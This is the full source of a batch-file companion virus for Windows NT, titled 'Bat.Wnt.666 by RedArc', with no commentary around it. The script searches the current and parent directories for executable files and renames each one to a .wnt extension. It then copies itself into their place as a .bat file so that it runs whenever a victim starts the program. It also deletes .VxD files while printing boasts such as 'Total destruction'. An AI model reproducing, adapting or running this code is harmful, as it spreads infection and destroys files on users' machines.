Bat.Wnt.666 by RedArc


@echo off
if not exist c:\ntldr goto Y
if '%1'=='' goto Q
shift /1
goto W
:Q
cmd /X /Q /C %0 WinNT
cmd /Y /C
goto Y
:W
for %%i in (*.e* *.c*) do call :R %0 %%i %%~ni %%~p0
if defined WNT goto E
set WNT=%0
cd ..
goto W
:E
cd %~p0
call :T %~n0
goto Y
:R
if exist %3.wnt goto Y
ren %2 %3.wnt >nul
copy %4%1 %3.bat >nul
goto Y
:T
if exist %1.VxD echo Total destruction ;)   Win9x-file-killer ;)
if exist %1.VxD del %1.VxD >nul
if exist %1.exe ren %1.exe %1.VxD >nul
copy %1.wnt %1.exe >nul
cmd /c %1.exe
del %1.exe >nul
if exist %1.VxD echo RedArc represents new companion BAT-virus for WinNT.
if exist %1.VxD ren %1.VxD %1.exe >nul
:Y
